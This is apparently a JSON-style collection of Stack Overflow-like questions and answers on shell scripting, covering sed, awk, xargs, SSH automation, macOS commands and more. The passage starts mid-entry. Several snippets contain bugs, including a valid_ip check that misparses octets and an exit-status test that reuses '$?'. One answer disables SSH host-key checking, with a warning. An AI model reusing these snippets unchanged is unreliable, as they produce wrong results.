-l 1 | awk '{CMD[$2]++;count++;}END { for (a in CMD)print CMD[a] \" \" CMD[a]/count*100 \"% \" a;}' | grep -v \"./\" | column -c3 -s \" \" -t | sort -nr | nl | head -n20\n}\nAs you can see there are lots of functions which are used but are not relevant to me. While the alias command gives me a very concise output and I can easily see what all is there. In my case, 100% of them are shortcut commands\nEscaping aliases and functions syntax is different for system commands\nTo escape a defined alias you need to prefix it with \\ while for functions you need to either use command <originalcommand> or absolute path of the command /bin/originalcommand\nAliases have higher priority over function\nLook at the below example\nalias ls='echo alias && ls'\n$ ls() { /bin/ls -al }\nalias\n$ ls\nalias\ntotal 23173440\ndrwxrwxr-x+ 255 tarunlalwani  staff        8160 Jul 30 22:39 .\ndrwxr-xr-x+ 113 tarunlalwani  staff        3616 Jul 30 23:12 ..\n...\nAs you can see when we run the ls command, first the alias is used and then the next ls is calling the function.\nThis becomes also a way of wrapping an exiting function with the same name and re-using the original function inside as well, which can only be done using alias and promotes the format in the question",
    "How can I detect BSD vs. GNU version of date in shell script": "You want to detect what version of the date command you're using, not necessarily the OS version.\nThe GNU Coreutils date command accepts the --version option; other versions do not:\nif date --version >/dev/null 2>&1 ; then\n    echo Using GNU date\nelse\n    echo Not using GNU date\nfi\nBut as William Pursell suggests, if at all possible you should just use functionality common to both.\n(I think the options available for GNU date are pretty much a superset of those available for the BSD version; if that's the case, then code that assumes the BSD version should work with the GNU version.)",
    "How do I get vim's :sh command to source my bashrc?": "See :help 'shell'. You can set this string to include -l or --login, which will source your .bashrc file. So, you might have a line like this in your .vimrc:\nset shell=bash\\ --login\nNote that this will alter everything that invokes the shell, including :!. This shouldn't be much of a problem, but you should be aware of it.\nThe value of this command can also be changed by setting the $SHELL environment variable.",
    "Less dimwitted shell required": "Original Bourne supported ^ as the pipe operator. This was dropped in the Korn shell (from which the POSIX sh spec derived), and is thus a feature available in Bourne but not in POSIX sh.\nThus, this code tests for pre-POSIX Bourne shells.",
    "pass arguments between shell scripts but retain quotes": "Use \"$@\" instead of $* to preserve the quotes:\n./script2.sh \"$@\"\nMore info:\nhttp://tldp.org/LDP/abs/html/internalvariables.html\n$*\nAll of the positional parameters, seen as a single word\nNote: \"$*\" must be quoted.\n$@\nSame as $*, but each parameter is a quoted string, that is, the parameters are passed on intact, without interpretation or expansion. This means, among other things, that each parameter in the argument list is seen as a separate word.\nNote: Of course, \"$@\" should be quoted.",
    "Git shell prompts for password in an OpenSSH popup window": "Use $ git config --global core.askPass \"\"\nYou can also set credentials in your config to prevent being prompted every time (https://git-scm.com/docs/gitcredentials).",
    "why do I get \"Suspended (tty output)\" in one terminal but not in others?": "This will fix it:\nstty -tostop\nFrom the man page:\ntostop (-tostop)\nSend (do not send) SIGTTOU for background output. This causes background jobs to stop if they attempt terminal output.\nThis tostop is normally the default setting, as it's usually undesirable to mix the output of multiple jobs. So most people just want the foreground job to be able to print to the terminal.",
    "What setting in vim counteracts smartindent's refusal to indent # comments in shell scripts?": "Find the indent file, (e.g. /usr/share/vim/vim71/indent/sh.vim on my system)\nThis line looks like the problem:\nsetlocal indentkeys-=:,0#\nPerhaps you can fix this in your .vimrc or load a custom indent file manually.\nedit: It looks more complicated than I thought, but maybe there is something specifically set in the indenting file that you would need to fix.\n2nd edit: Looks like I was completely wrong, Check out:\nRestoring indent after typing hash\nor\nhowto-configure-vim-to-not-put-comments-at-the-beginning-of-lines-while-editing",
    "how to pass \"one\" argument and use it twice in \"xargs\" command": "If you can't change the input format, you could set the delimiter to a space:\n$ echo -n {0..4} | xargs -d \" \" -I@ echo @,@\n0,0\n1,1\n2,2\n3,3\n4,4\nOtherwise, change the input to separate the tokens with a newline:\n$ printf \"%s\\n\" {0..4} | xargs -I@ echo @,@\n0,0\n1,1\n2,2\n3,3\n4,4\nThe reason for this syntax is explained in man xargs\n-I replace-str\n\nReplace occurrences of replace-str in the  initial-arguments  with  names  read  from\nstandard input.  Also, unquoted blanks do not terminate input items; instead the sep\u2010\narator is the newline character.  Implies -x and -L 1.\nSo you must set the delimiter manually to a space if you want to delimit fields.",
    "How do you export a variable through shell script?": "You can put export statements in a shell script and then use the 'source' command to execute it in the current process:\nsource a.sh",
    "What's the Windows equivalent of a UNIX shell script?": "Take a look at PowerShell, which is the closest you will get to a true scripting language like you have in Unix. Other than that, for simple things such as simply runnning an application, take a look at Windows command script/MS-DOS batch files.",
    "How to manually run a laravel/lumen job using command line": "",
    "How to do a if else match on pattern in awk": "Classic way:\nawk '{if ($0 ~ /pattern/) {then_actions} else {else_actions}}' file\n$0 represents the whole input record.\nAnother idiomatic way based on the ternary operator syntax selector ? if-true-exp : if-false-exp\nawk '{print ($0 ~ /pattern/)?text_for_true:text_for_false}'\nawk '{x == y ? a[i++] : b[i++]}'\n\nawk '{print ($0 ~ /two/)?NR \"yes\":NR \"No\"}' <<<$'one two\\nthree four\\nfive six\\nseven two'\n1yes\n2No\n3No\n4yes",
    "\\r character in shell script": "Your problem is that the file has Windows line endings. This can be caused by editing a file in Windows and trying to run it on a non-Windows system.\nYou can fix this problem using dos2unix to convert the line endings:\ndos2unix ConstruedTermsXMLGenerator.sh\nThe corresponding utility to convert in the other direction is unix2dos.\nSome systems have fromdos and todos.",
    "How to shave off last character using sed?": "You can try:\nsed s'/.$//'\nThe regex used is .$\n. is a regex meta char to match anything (except newline)\n$ is the end of line anchor.\nBy using the $ we force the . to match the last char\nThis will remove the last char, be it anything:\n$ echo ABCD | sed s'/.$//'\nABC\n$ echo ABCD1 | sed s'/.$//'\nABCD\nBut if you want to remove the last char, only if its an alphabet, you can do:\n$ echo ABCD | sed s'/[a-zA-Z]$//'\nABC\n$ echo ABCD1 | sed s'/[a-zA-Z]$//'\nABCD1",
    "How to do a mass rename?": "Easiest solution is to use \"mmv\"\nYou can write:\nmmv \"long_name*.txt\" \"short_#1.txt\"\nWhere the \"#1\" is replaced by whatever is matched by the first wildcard. Similarly #2 is replaced by the second, etc.\nSo you do something like\nmmv \"index*_type*.txt\" \"t#2_i#1.txt\"\nTo rename index1_type9.txt to t9_i1.txt\nmmv is not standard in many Linux distributions but is easily found on the net.",
    "Check if local git repo is ahead/behind remote": "For future reference. As of Git v2.17.0\ngit status -sb\ncontains the word behind . So that can be used directly to check for pulls.\nNote: Remember to run git fetch before running git status -sb",
    "In Python, get the output of system command as a string [duplicate]": "Use os.popen():\ntmp = os.popen(\"ls\").read()\nThe newer way (> python 2.6) to do this is to use subprocess:\nproc = subprocess.Popen('ls', stdout=subprocess.PIPE)\ntmp = proc.stdout.read()",
    "shell script error expecting \"do\"": "I suspect line endings.\nTry:\nhexdump -C yourscript.sh \nAnd look for 0d 0a sequences. You can strip \\r (0d) with the tr command:\ncat yourscript.sh | tr -d '\\r' >> yournewscript.sh",
    "Execute terminal command from python in new terminal window?": "There's no way to do this in general from a shell. What you have to do is run the terminal program itself, or some launcher program that does so for you. And the way to do that is different for each terminal program.\nIn some cases, os.startfile will do what you want, but this isn't going to be universal.\nAlso, note in general, you're going to actually need an absolute path to your script, because the new terminal window will be running a new shell and therefore won't necessarily have your same working directory. But I'll ignore that for the examples.\nWith Windows cmd, the easiest way to do it is the start shell command. If the thing you start is any command-line program, including python, it will get a new cmd window. So, something like:\nsubprocess.call('start /wait python bb.py', shell=True)\nOS X has a similar command, open. And it's a real program rather than a shell command, so you don't need shell=True. However, running a command-line program or script with open doesn't generally open a new terminal window. In fact, the whole point of it is to allow you to run programs as if they were being double-clicked in Finder, which never runs something in the terminal unless it's a .command file.\nSo, you can create a temporary .command wrapper file and open that; something like this (untested):\nwith tempfile.NamedTemporaryFile(suffix='.command') as f:\n    f.write('#!/bin/sh\\npython bb.py\\n')\n    subprocess.call(['open', '-W', f.name])\nAlternatively, you can explicitly tell open to use Terminal.app, something like this:\nsubprocess.call(['open', '-W', '-a', 'Terminal.app', 'python', '--args', 'bb.py'])\nOr you can script Terminal.app via AppleEvents. For example:\nappscript.app('Terminal').do_script('python bb.py')\nThe \"do script\" event opens a new window and runs its argument as a command. If you want more detailed control, open the scripting dictionary in AppleScript Editor and see all the fun stuff you can do.\nOn Linux or other *nix systems\u2026 well, there are 65,102 different desktop environments, launchers, and terminal programs. Do you need to work on all of them?\nWith gnome-terminal, just running the terminal again gives you a new window, and the -x argument lets you specify an initial command, so:\nsubprocess.call(['gnome-terminal', '-x', 'python bb.py'])\nMany older terminals try to be compatible with xterm, which does the same thing with -e, so:\nsubprocess.call(['xterm', '-e', 'python bb.py'])\nsubprocess.call(['rxvt', '-e', 'python bb.py'])\n\u2026 etc.\nHow do you know which terminal the user is using? Good question. You could walk the like of parent processes from yourself until you find something that looks like a terminal. Or you could just assume everyone has xterm. Or you could look at how various distros configure a default terminal and search for all of them. Or\u2026",
    "Piping stdin to R": "",
    "Multiple commands on remote machine using shell script": "Try something like this:\nssh you@yours.com \"cd /home && ls -l\"",
    "How to pass variables from Jenkinsfile to shell command": "",
    "Merging CSV files : Appending instead of merging": "Assuming that all the csv files have the same format and all start with the same header, you can write a little script as the following to append all files in only one and to take only one time the header.\n#!/bin/bash\nOutFileName=\"X.csv\"                       # Fix the output name\ni=0                                       # Reset a counter\nfor filename in ./*.csv; do \n if [ \"$filename\"  != \"$OutFileName\" ] ;      # Avoid recursion \n then \n   if [[ $i -eq 0 ]] ; then \n      head -1  \"$filename\" >   \"$OutFileName\" # Copy header if it is the first file\n   fi\n   tail -n +2  \"$filename\" >>  \"$OutFileName\" # Append from the 2nd line each file\n   i=$(( $i + 1 ))                            # Increase the counter\n fi\ndone\nNotes:\nThe head -1 or head -n 1 command print the first line of a file (the head).\nThe tail -n +2 prints the tail of a file starting from the lines number 2 (+2)\nTest [ ... ] is used to exclude the output file from the input list.\nThe output file is rewritten each time.\nThe command cat a.csv b.csv > X.csv can be simply used to append a.csv and b csv in a single file (but you copy 2 times the header).\nThe paste command pastes the files one on a side of the other. If a file has white spaces as lines you can obtain the output that you reported above.\nThe use of -d , asks to paste command to define fields separated by a comma ,, but this is not the case for the format of the files you reported above.\nThe cat command instead concatenates files and prints on the standard output, that means it writes one file after the other.\nRefer to man head or man tail for the syntax of the single options (some version allows head -1 other instead head -n 1)...",
    "Determining whether shell script was executed \"sourcing\" it": "I think, what Sam wants to do may be not possible.\nTo what degree a half-baken workaround is possible, depends on...\n...the default shell of users, and\n...which alternative shells they are allowed to use.\nIf I understand Sam's requirement correctly, he wants to have a 'script', myscript, that is...\n...not directly executable via invoking it by its name myscript (i.e. that has chmod a-x);\n...not indirectly executable for users by invoking sh myscript or invoking bash myscript\n...only running its contained functions and commands if invoked by sourcing it: . myscript\nThe first things to consider are these\nInvoking a script directly by its name (myscript) requires a first line in the script like #!/bin/bash or similar. This will directly determine which installed instance of the bash executable (or symlink) will be invoked to run the script's content. This will be a new shell process. It requires the scriptfile itself to have the executable flag set.\nRunning a script by invoking a shell binary with the script's (path+)name as an argument (sh myscript), is the same as '1.' -- except that the executable flag does not need to be set, and said first line with the hashbang isn't required either. The only thing needed is that the invoking user needs read access to the scriptfile.\nInvoking a script by sourcing its filename (. myscript) is very much the same as '1.' -- exept that it isn't a new shell that is invoked. All the script's commands are executed in the current shell, using its environment (and also \"polluting\" its environment with any (new) variables it may set or change. (Usually this is a very dangerous thing to do: but here it could be used to execute exit $RETURNVALUE under certain conditions....)\nFor '1.':\nEasy to achieve: chmod a-x myscript will prevent myscript from being directly executable. But this will not fullfill requirements '2.' and '3.'.\nFor '2.' and '3.':\nMuch harder to achieve. Invokations by sh myscript require reading privileges for the file. So an obvious way out would seem to chmod a-r\nmyscript. However, this will also dis-allow '3.': you will not be able to source the script either.\nSo what about writting the script in a way that uses a Bashism? A Bashism is a specific way to do something which other shells do not understand: using specific variables, commands etc. This could be used inside the script to discover this condition and \"do something\" about it (like \"display warning.txt\", \"mailto admin\" etc.). But there is no way in hell that this will prevent sh or bash or any other shell from reading and trying to execute all the following commands/lines written into the script unless you kill the shell by invoking exit.\nExamples: in Bash, the environment seen by the script knows of $BASH, $BASH_ARGV, $BASH_COMMAND, $BASH_SUBSHELL, BASH_EXECUTION_STRING... . If invoked by sh (also if sourced inside a sh), the executing shell will see all these $BASH_* as empty environment variables. Again, this could be used inside the script to discover this condition and \"do something\"... but not prevent the following commands from being invoked!\nI'm now assuming that...\n...the script is using #!/bin/bash as its first line,\n...users have set Bash as their shell and are invoking commands in the following table from Bash and it is their login shell,\n...sh is available and it is a symlink to bash or dash.\nThis will mean the following invokations are possible, with the listed values for environment variables\nvars+invok's   | ./scriptname | sh scriptname | bash scriptname | . scriptname\n---------------+--------------+---------------+-----------------+-------------\n$0             | ./scriptname | ./scriptname  | ./scriptname    | -bash\n$SHLVL         | 2            | 1             | 2               | 1\n$SHELLOPTS     | braceexpand: | (empty)       | braceexpand:..  | braceexpand:\n$BASH          | /bin/bash    | (empty)       | /bin/bash       | /bin/bash\n$BASH_ARGV     | (empty)      | (empty)       | (empty)         | scriptname\n$BASH_SUBSHELL | 0            | (empty)       | 0               | 0\n$SHELL         | /bin/bash    | /bin/bash     | /bin/bash       | /bin/bash\n$OPTARG        | (empty)      | (empty)       | (emtpy)         | (emtpy)\nNow you could put a logic into your text script:\nIf $0 is not equal to -bash, then do an exit $SOMERETURNVALUE.\nIn case the script was called via sh myscript or bash myscript, then it will exit the calling shell. In case it was run in the current shell, it will continue to run. (Warning: in case the script has any other exit statements, your current shell will be 'killed'...)\nSo put into your non-executable myscript.txt near its beginning something like this may do something close to your goal:\necho BASH=$BASH\ntest x${BASH} = x/bin/bash && echo \"$? :    FINE.... You're using 'bash ...'\"\ntest x${BASH} = x/bin/bash || echo \"$? :    RATS !!! -- You're not using BASH and I will kick you out!\"\ntest x${BASH} = x/bin/bash || exit 42\ntest x\"${0}\" = x\"-bash\"    && echo \"$? :    FINE.... You've sourced me, and I'm your login shell.\"\ntest x\"${0}\" = x\"-bash\"    || echo \"$? :    RATS !!! -- You've not sourced me (or I'm not your bash login shell) and I will kick you out!\"\ntest x\"${0}\" = x\"-bash\"    || exit 33",
    "How to ignore or Pass 'Yes' when The authenticity of host can't be established in Expect Shell script during Automation": "It's possible to avoid this question and accept all incoming keys automaticatilly by using ssh client option StrictHostKeyChecking set to no (default setting is ask, which results in that question):\nssh -o StrictHostKeyChecking=no \"$user@$host\"\nHowever, note that it would be hardly any secure, as you're basically accepting connect with everyone who may act as a given host. The only secure way to avoid question is to pre-distribute host public keys to clients, i.e. in form of pre-generated known hosts file, which can be used in some way like that:\nssh \\\n    -o UserKnownHostsFile=PATH_TO_YOUR_KNOWN_HOSTS_FILE \\\n    -o StrictHostKeyChecking=yes \"$user@$host\"\nThis way you'll avoid the question if the check fails, and ssh will result in non-zero exit status.",
    "Make sure int variable is 2 digits long, else add 0 in front to make it 2 digits long": "You can use the bash-builtin printf with the -v option to write it to a variable rather than print it to standard output:\npax> inputNo=5   ; printf -v inputNo \"%02d\" $inputNo ; echo $inputNo\n05\npax> inputNo=102 ; printf -v inputNo \"%02d\" $inputNo ; echo $inputNo\n102\nYou'll want to make sure it's numeric first otherwise the conversion will fail. If you want to be able to pad any string out to two or more characters, you can also use:\nwhile [[ ${#inputNo} -lt 2 ]] ; do\n    inputNo=\"0${inputNo}\"\ndone\nwhich is basically a while loop that prefixes your string with \"0\" until the length is greater than or equal to two.\nNote that this can also be done in bash by prefixing the number with two zeroes then simply getting the last two characters of that string, checking first that it's not already at least the desired size:\nif [[ ${#inputNo} -lt 2 ]] ; then\n    inputNo=\"00${inputNo}\"\n    inputNo=\"${inputNo: -2}\"\nfi\nThe difference is probably not too great for a two-digit number but you may find the latter solution is better if you need larger widths.\nIf you're using a shell other than bash (unlikely, based on your tags), you'll need to find the equivalents, or revert to using external processes to do the work, something like:\nwhile [[ $(echo -n ${inputNo} | wc -c) -lt 2 ]] ; do\n    inputNo=\"0${inputNo}\"\ndone\nThis does basically what you were thinking off in your question but note the use of -n in the echo command to prevent the trailing newline (which was almost certainly causing your off-by-one error).\nBut, as stated, this is a fall-back position. If you're using bash, the earlier suggestions of mine are probably best.",
    "How can I use \"sed\" to delete 2 lines after match/matches?": "Two ways, depending upon the sed version and platform:\nsed -e '/match1/,+2d' -e '/match2/,+2d' < oldfile > newfile\nor\nsed -e '/match1\\|match2/,+2d' < oldfile > newfile",
    "how to find whether a script run as a nohup finished or not?": "At the beginning of your shell script, write the PID to a file (for example, in /var/run). Then, you can just search for that PID to know if the process is done or not. You can get the PID of your shell script using the built-in $$ variable.\nTo record the PID, put at the top of your script:\necho $$ > /var/run/myscript.pid\nThen, to check if it's still running:\nps -p `cat /var/run/myscript.pid`\nYou might not be able to write into /var/run as a normal user. If not, just use /tmp",
    "sed: just trying to remove a substring": "You need to:\n$ sed -r 's/^foo:&nbsp;//' file.txt",
    "How to sleep for 1 second between each xargs command?": "You can use the following syntax:\nps aux | awk '{print $1}' | xargs -I % sh -c '{ echo %; sleep 1; }'\nBe careful with spaces and semicolons though. After every command in between brackets, semicolon is required (even after the last one).",
    "How to detect if a git clone failed in a bash script": "Here are some common forms. Which is the best to choose depends on what you do. You can use any subset or combination of them in a single script without it being bad style.\nif ! failingcommand\nthen\n    echo >&2 message\n    exit 1\nfi\nfailingcommand\nret=$?\nif ! test \"$ret\" -eq 0\nthen\n    echo >&2 \"command failed with exit status $ret\"\n    exit 1\nfi\nfailingcommand || exit \"$?\"\nfailingcommand || { echo >&2 \"failed with $?\"; exit 1; }",
    "How do I get a Mac \".command\" file to automatically quit after running a shell script?": "I was finally able to track down an answer to this. Similar to cobbal's answer, it invokes AppleScript, but since it's the only window that I'd have open, and I want to run my script as a quick open-and-close operation, this more brutish approach, works great for me.\nWithin the \".command\" script itself, \"...add this line to your script at the end\"\nosascript -e 'tell application \"Terminal\" to quit' &\nexit\nSOURCE: http://forums.macosxhints.com/archive/index.php/t-2538.html",
    "OSX: check if the screen is locked": "First, there's a bit of confusion in your question. Both Shift+Control+Eject and Energy Saver put the screens to sleep, which isn't the same thing as locking them. Depending on your other settings, this may also entail locking the screen, but that's a separate issue. IIRC, on Lion, by default, neither one will ever lock the screen\u2014but if you leave the screen asleep for longer than the time set in Security & Privacy, that will lock it.\nAnyway, the API CGSessionCopyCurrentDictionary allows you to get information about both screen sleep and screen lock, for your GUI session. If you don't have a GUI session (e.g., because you're running in an ssh shell), or your session doesn't own the console (e.g., because someone has fast-user-switched you out), you won't be able to get this information, but you will at least be able to detect those cases.\nThis is the only mechanism I know of that works for all OS's from 10.5 (actually 10.3) to 10.8 (but that doesn't mean it's the only one there actually is\u2026).\nThere's no direct way to call this from bash or AppleScript. However, you can use your favorite bridge (PyObjC, MacRuby, ASOC, etc.) to call it indirectly. Here's an example using Python:\n#!/usr/bin/python\nimport Quartz\nd = Quartz.CGSessionCopyCurrentDictionary()\nprint d\nHere's how to interpret the response:\nIf you get nothing back, then you don't have a UI session.\nIf the dictionary has kCGSSessionOnConsoleKey = 0, or not present, either your GUI session doesn't own the console, or the console's screens are asleep.\nIf the dictionary has CGSSessionScreenIsLocked = 1, the screens are locked.\nThe one problem case is where kCGSSessionOnConsoleKey is 0 (or missing) and CGSSessionScreenIsLocked is 1. In that case, either you've put the screens to sleep and locked them, or someone else has taken the console and locked the screens (with or without putting them to sleep). And I'm not sure if there's a way to distinguish between these cases. But if you're looking for \"don't try to display a dialog because the user will have to unlock the screen first\", both of those cases mean \"don't display a dialog\".\nSo, this should give you what you want:\n#!/usr/bin/python\nimport sys\nimport Quartz\nd=Quartz.CGSessionCopyCurrentDictionary()\nsys.exit(d and \n         d.get(\"CGSSessionScreenIsLocked\", 0) == 0 and \n         d.get(\"kCGSSessionOnConsoleKey\", 0) == 1)\nOr, turning it into a one-liner you can put directly in a shell script:\npython -c 'import sys,Quartz; d=Quartz.CGSessionCopyCurrentDictionary(); sys.exit(d and d.get(\"CGSSessionScreenIsLocked\", 0) == 0 and d.get(\"kCGSSessionOnConsoleKey\", 0) == 1)'\nNow, what if you've ssh'd into a Mac, and you're also currently logged into that Mac's GUI console (as the same user)? In that case, your ssh login session can communicate with the console login session in exactly the same way that a local Terminal login session would. So, CGSessionCopyCurrentDictionary is going to get the same values.\nThe bootstrap server that mediates that connection will apply some restrictions (e.g., security authorize -u foo should work from the Terminal but not over ssh), but those aren't fully documented, and change from version to version, so that's probably not something you want to rely on. Instead, you want to actually read your login session information\nIf you want to go further with this, start with reading Multiple User Environments Programming Topics. But some of the information isn't really documented anywhere (e.g., how the Mach-level sessions referenced by SessionGetInfo and the BSD-level sessions referenced by utmpx are tied together). Many of the relevant tools and libraries are open source, which may help. Even if reading up on all of that doesn't tell you how to do what you want, it will tell you exactly what you want, and the right terms to use to search and ask questions, which may be good enough.",
    "Django shell mode in docker": "I use this command (when run with compose)\ndocker-compose run <service_name> python manage.py shell   \nwhere <service name> is the name of the docker service(in docker-compose.yml).\nSo, In your case the command will be\ndocker-compose run web python manage.py shell   \nhttps://docs.docker.com/compose/reference/run/\nWhen run with Dockerfile\ndocker exec -it <container_id> python manage.py shell",
    "Windows shell add item to context menu when click on blank part of folder": "I figured out the answer. The folder is actually Directory\\Background, you have to add the empty string value of NoWorkingDirectory into it, and the %1 in the command becomes a %V\n[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\console2]\n@=\"Open Console2 Here\"\n\"NoWorkingDirectory\"=\"\"\n\n[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\console2\\command]\n@=\"C:\\\\Program Files\\\\Console\\\\console.exe -d \\\"\\\"%V\\\"\\\"\"\nSource: saviert's comment at http://www.howtogeek.com/howto/windows-vista/make-command-prompt-here-always-display-for-folders-in-windows-vista#comment-57856",
    "How to use awk for a compressed file": "You need to read them compressed files like this:\nawk '{ ... }' <(gzip -dc input1.vcf.gz) <(gzip -dc input2.vcf.gz)\nTry this:\nawk 'FNR==NR { sub(/AA=\\.;/,\"\"); array[$1,$2]=$8; next } ($1,$2) in array { print $0 \";\" array[$1,$2] }' <(gzip -dc input1.vcf.gz) <(gzip -dc input2.vcf.gz) | gzip > output.vcf.gz",
    "Why does unix while read not read last line? [duplicate]": "What's happening is, the read command fails when the input is not terminated with a newline. Since the newline character is missing at the end of your file, the read fails, so the last iteration of the while loop is skipped.\nIf you don't want to / cannot make sure that your input file has a newline at the end, you can group your cat with an echo to give the appearance of an input terminated by newline, for example like this:\n{ cat hello; echo; } | while read a b c d; do\n    echo $a,$b,$c,$d\ndone\nor like this:\n(cat hello; echo) | while read a b c d; do\n    echo $a,$b,$c,$d\ndone",
    "Terminal command to show connected displays/monitors/resolutions?": "You can use system_profiler SPDisplaysDataType or defaults read /Library/Preferences/com.apple.windowserver.plist (defaults read /Library/Preferences/com.apple.windowserver.displays.plist in recent macos versions):\n$ system_profiler SPDisplaysDataType\nGraphics/Displays:\n\n    NVIDIA GeForce GT 640M:\n\n      Chipset Model: NVIDIA GeForce GT 640M\n      Type: GPU\n      Bus: PCIe\n      PCIe Lane Width: x16\n      VRAM (Total): 512 MB\n      Vendor: NVIDIA (0x10de)\n      Device ID: 0x0fd8\n      Revision ID: 0x00a2\n      ROM Revision: 3707\n      Displays:\n        iMac:\n          Display Type: LCD\n          Resolution: 1920 x 1080\n          Pixel Depth: 32-Bit Color (ARGB8888)\n          Main Display: Yes\n          Mirror: Off\n          Online: Yes\n          Built-In: Yes\n          Connection Type: DisplayPort\n\n# For recent macos versions:\n# $ defaults read /Library/Preferences/com.apple.windowserver.displays.plist\n$ defaults read /Library/Preferences/com.apple.windowserver.plist\n{\n    DisplayResolutionEnabled = 1;\n    DisplaySets =     (\n                (\n                        {\n                Active = 1;\n                Depth = 4;\n                DisplayID = 69731456;\n                DisplayProductID = 40978;\n                DisplaySerialNumber = 0;\n                DisplayVendorID = 1552;\n                Height = 1080;\n                IODisplayLocation = \"IOService:/AppleACPIPlatformExpert/PCI0@0/AppleACPIPCI/P0P2@1/IOPCI2PCIBridge/GFX0@0/NVDA,Display-A@0/NVDA\";\n                IOFlags = 7;\n                LimitsHeight = 1080;\n                LimitsOriginX = 0;\n                LimitsOriginY = 0;\n                LimitsWidth = 1920;\n                MirrorID = 0;\n                Mirrored = 0;\n                Mode =                 {\n                    BitsPerPixel = 32;\n                    BitsPerSample = 8;\n                    DepthFormat = 4;\n                    Height = 1080;\n                    IODisplayModeID = \"-2147479552\";\n                    IOFlags = 7;\n                    Mode = 1;\n                    PixelEncoding = \"--------RRRRRRRRGGGGGGGGBBBBBBBB\";\n                    RefreshRate = 0;\n                    SamplesPerPixel = 3;\n                    UsableForDesktopGUI = 1;\n                    Width = 1920;\n                    kCGDisplayBytesPerRow = 7680;\n                    kCGDisplayHorizontalResolution = 103;\n                    kCGDisplayModeIsInterlaced = 0;\n                    kCGDisplayModeIsSafeForHardware = 1;\n                    kCGDisplayModeIsStretched = 0;\n                    kCGDisplayModeIsTelevisionOutput = 0;\n                    kCGDisplayModeIsUnavailable = 0;\n                    kCGDisplayModeSuitableForUI = 1;\n                    kCGDisplayPixelsHigh = 1080;\n                    kCGDisplayPixelsWide = 1920;\n                    kCGDisplayResolution = 1;\n                    kCGDisplayVerticalResolution = 103;\n                };\n                OriginX = 0;\n                OriginY = 0;\n                PixelEncoding = \"--------RRRRRRRRGGGGGGGGBBBBBBBB\";\n                Resolution = 1;\n                Unit = 0;\n                UnmirroredHeight = 1080;\n                UnmirroredLimitsHeight = 1080;\n                UnmirroredLimitsOriginX = 0;\n                UnmirroredLimitsOriginY = 0;\n                UnmirroredLimitsWidth = 1920;\n                UnmirroredMode =                 {\n                    BitsPerPixel = 32;\n                    BitsPerSample = 8;\n                    DepthFormat = 4;\n                    Height = 1080;\n                    IODisplayModeID = \"-2147479552\";\n                    IOFlags = 7;\n                    Mode = 1;\n                    PixelEncoding = \"--------RRRRRRRRGGGGGGGGBBBBBBBB\";\n                    RefreshRate = 0;\n                    SamplesPerPixel = 3;\n                    UsableForDesktopGUI = 1;\n                    Width = 1920;\n                    kCGDisplayBytesPerRow = 7680;\n                    kCGDisplayHorizontalResolution = 103;\n                    kCGDisplayModeIsInterlaced = 0;\n                    kCGDisplayModeIsSafeForHardware = 1;\n                    kCGDisplayModeIsStretched = 0;\n                    kCGDisplayModeIsTelevisionOutput = 0;\n                    kCGDisplayModeIsUnavailable = 0;\n                    kCGDisplayModeSuitableForUI = 1;\n                    kCGDisplayPixelsHigh = 1080;\n                    kCGDisplayPixelsWide = 1920;\n                    kCGDisplayResolution = 1;\n                    kCGDisplayVerticalResolution = 103;\n                };\n                UnmirroredOriginX = 0;\n                UnmirroredOriginY = 0;\n                UnmirroredResolution = 1;\n                UnmirroredWidth = 1920;\n                Width = 1920;\n            }\n        )\n    );\n    ForceOldStyleMemoryManagement = 0;\n}",
    "How to find basename of path via pipe": "To apply a command to every result of a piped operation, xargs is your friend. As it says on the man page I linked...\nxargs reads items from the standard input, delimited by blanks (which can be protected with double or single quotes or a backslash) or newlines, and executes the command (default is /bin/echo) one or more times with any initial-arguments followed by items read from standard input.\nIn this case that means it will take each result from your find command and run basename <find result>ad nauseum, until find has completed its search. I believe what you want is going to look a lot like this:\nfind \"$all_locks\" -mindepth 1 -maxdepth 1 -type d | xargs basename",
    "How to use bash return code in conditional?": "The return code is available in the special parameter $? after the command exits. Typically, you only need to use it when you want to save its value before running another command:\nvalid_ip \"$IP1\"\nstatus1=$?\nvalid_ip \"$IP2\"\nif [ $status1 -eq 0 ] || [ $? -eq 0 ]; then\nor if you need to distinguish between various non-zero statuses:\nvalid_ip \"$IP\"\ncase $? in\n    1) echo valid_IP failed because of foo ;;\n    2) echo valid_IP failed because of bar ;;\n    0) echo Success ;;\nesac\nOtherwise, you let the various operators check it implicitly:\nif valid_ip \"$IP\"; then\n    echo \"OK\"\nfi\n\nvalid_IP \"$IP\" && echo \"OK\"\nHere is a simple, idiomatic way of writing valid_ip:\nvalid_ip () {\n    local ip=$1\n    [[ $ip =~ ^[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$ ]] && {\n        IFS='.' read a b c d <<< \"$ip\"\n        (( a < 255 && b < 255 && c < 255 && d << 255 ))\n    }\n}\nThere are two expressions, the [[...]] and the { ... }; the two are joined by &&. If the first fails, then valid_ip fails. If it suceeds, then the second expression (the compound statement) is evaluated. The read splits the string into four variables, and each is tested separately inside the arithmetic expression. If all are true, then the ((...)) succeeds, which means the && list succeeds, which means that valid_ip succeeds. No need to store or return explicit return codes.",
    "naming convention for shell script and makefile": "Google's open-source style uses underscores as separators: https://google.github.io/styleguide/shellguide.html#s7.4-source-filenames.\nSo in your case, it would be do_this_please.sh or do_this_please using this style.",
    "How to submit a job to a specific node in PBS": "You can do it like this:\n#PBS -l nodes=<node_name>\nYou can also specify the number of processors:\n#PBS -l nodes=<node_name>:ppn=X\nOr you can request additional nodes, specified or unspecified:\n#PBS -l nodes=<node_name1>[:ppn=X][+<node_name2...]\nThat gives you multiple specific nodes.\n#PBS -l nodes=<node_name>[:ppn=X][+Y[:ppn=Z]]\nThis requests the specific node with X execution slots from that node, plus an additional Y nodes with Z execution slots each.\nEdit: To simply request a number of nodes and execution slots per node:\nPBS -l nodes=X:ppn=Y\nNOTE: this is all for TORQUE/Moab. It may or may not work for other PBS resource managers/schedulers.",
    "Redirecting output from a function block to a file in Linux": "Do the redirection when you are calling the function.\n#!/bin/bash\ninitialize() {\n  echo 'initializing'\n  ...\n}\n#call the function with the redirection you want\ninitialize >> your_file.log\nAlternatively, open a subshell in the function and redirect the subshell output:\n#!/bin/bash\ninitialize() {\n  (  # opening the subshell\n    echo 'initializing'\n    ...\n  # closing and redirecting the subshell\n  ) >> your_file.log\n}\n# call the function normally\ninitialize",
